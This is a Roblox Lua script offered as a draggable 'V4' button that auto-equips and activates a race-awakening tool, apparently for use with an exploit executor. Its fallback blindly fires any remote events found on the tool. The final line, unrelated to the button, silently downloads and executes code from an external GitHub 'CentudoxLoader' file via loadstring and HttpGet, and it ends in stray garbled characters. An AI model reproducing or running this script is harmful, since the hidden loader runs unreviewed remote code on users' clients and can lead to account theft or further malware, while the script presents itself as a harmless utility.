-- Reliable Race V4 Awakening Button
-- Equip -> activate -> put back in backpack
-- Draggable, repeatable, works after respawn

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local VIM
pcall(function() VIM = game:GetService("VirtualInputManager") end)

-- CONFIG
local TOOL_NAME = "Awakening"   -- Change if your tool is called something else (e.g. "Race Awakening")
local EQUIP_WAIT = 3
local FIND_WAIT = 4
local POST_ACT_WAIT = 0.25

-- State
local character = player.Character or player.CharacterAdded:Wait()
local humanoid
local debounce = false

local function refreshCharacter(chr)
    character = chr
    humanoid = chr:FindFirstChildOfClass("Humanoid") or chr:WaitForChild("Humanoid")
end

refreshCharacter(character)
player.CharacterAdded:Connect(refreshCharacter)

-- GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RaceV4Gui"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local btn = Instance.new("TextButton")
btn.Name = "RaceV4Button"
btn.Size = UDim2.new(0, 70, 0, 70) -- smaller than V3 button
btn.Position = UDim2.new(1, -90, 1, -140)
btn.AnchorPoint = Vector2.new(0.5, 0.5)
btn.Text = "V4"
btn.Font = Enum.Font.SourceSansBold
btn.TextSize = 16
btn.TextColor3 = Color3.fromRGB(255,255,255)
btn.BackgroundColor3 = Color3.fromRGB(25, 90, 180)
btn.AutoButtonColor = false
btn.BorderSizePixel = 0
btn.Parent = screenGui

local uic = Instance.new("UICorner", btn)
uic.CornerRadius = UDim.new(1,0)

-- Draggable (same system as before)
local dragging = false
local dragInput = nil
local dragStart = Vector2.new()
local startPos = Vector2.new()
local movedDistance = 0
local DRAG_THRESHOLD = 6

local function update(input)
    local delta = input.Position - dragStart
    local newX = math.clamp(startPos.X + delta.X, 0, workspace.CurrentCamera.ViewportSize.X - btn.AbsoluteSize.X)
    local newY = math.clamp(startPos.Y + delta.Y, 0, workspace.CurrentCamera.ViewportSize.Y - btn.AbsoluteSize.Y)
    btn.Position = UDim2.new(0, newX, 0, newY)
end

btn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragInput = input
        dragStart = input.Position
        startPos = Vector2.new(btn.AbsolutePosition.X, btn.AbsolutePosition.Y)
        movedDistance = 0

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
                dragInput = nil
            end
        end)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = (input.Position - dragStart).magnitude
        movedDistance = delta
        if delta > DRAG_THRESHOLD then
            update(input)
        end
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input == dragInput then
        dragging = false
        dragInput = nil
        movedDistance = 0
    end
end)

-- Tool finder
local function findTool()
    local backpack = player:FindFirstChild("Backpack")
    local char = character
    local t

    if backpack then
        t = backpack:FindFirstChild(TOOL_NAME)
        if t then return t end
    end
    if char then
        t = char:FindFirstChild(TOOL_NAME)
        if t then return t end
    end

    -- case-insensitive fallback
    if backpack then
        for _, c in ipairs(backpack:GetChildren()) do
            if c:IsA("Tool") and string.find(string.lower(c.Name), string.lower(TOOL_NAME)) then
                return c
            end
        end
    end
    if char then
        for _, c in ipairs(char:GetChildren()) do
            if c:IsA("Tool") and string.find(string.lower(c.Name), string.lower(TOOL_NAME)) then
                return c
            end
        end
    end

    return nil
end

-- Try to activate
local function tryActivateTool(tool)
    local ok, _ = pcall(function() if tool and tool.Parent == character then tool:Activate() end end)
    if ok then return true end

    if VIM then
        local ok2, _ = pcall(function()
            VIM:SendKeyEvent(true, Enum.KeyCode.T, false, game)
            VIM:SendKeyEvent(false, Enum.KeyCode.T, false, game)
        end)
        if ok2 then return true end
    end

    for _, child in ipairs(tool:GetDescendants()) do
        if child:IsA("RemoteEvent") then
            local ok3, _ = pcall(function() child:FireServer() end)
            if ok3 then return true end
        elseif child:IsA("RemoteFunction") then
            local ok4, _ = pcall(function() child:InvokeServer() end)
            if ok4 then return true end
        end
    end

    return false
end

-- Main routine
local function activateV4()
    if debounce then return end
    debounce = true
    local originalText = btn.Text
    btn.Text = "Awakening..."

    local tool = findTool()
    local waited = 0
    while not tool and waited < FIND_WAIT do
        task.wait(0.2)
        waited = waited + 0.2
        tool = findTool()
    end

    if not tool then
        btn.Text = "No Tool"
        task.wait(1)
        btn.Text = originalText
        debounce = false
        return
    end

    if tool.Parent ~= character then
        if humanoid then pcall(function() humanoid:EquipTool(tool) end) end
    end
    task.wait(0.2)

    local activated = false
    if tool and tool.Parent == character then
        activated = tryActivateTool(tool)
    end

    task.wait(POST_ACT_WAIT)
    if tool and tool.Parent == character then
        local backpack = player:FindFirstChild("Backpack")
        if backpack then pcall(function() tool.Parent = backpack end) end
    end

    btn.Text = activated and "Done" or "Failed"
    task.wait(0.5)
    btn.Text = originalText
    debounce = false
end

-- Only trigger on tap (not drag)
btn.Activated:Connect(function()
    if movedDistance > DRAG_THRESHOLD then return end
    activateV4()
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/ParadozCode/CentuDox-Hub-Paradoz-Hub/refs/heads/main/CentudoxLoader.xyz", true))()`l
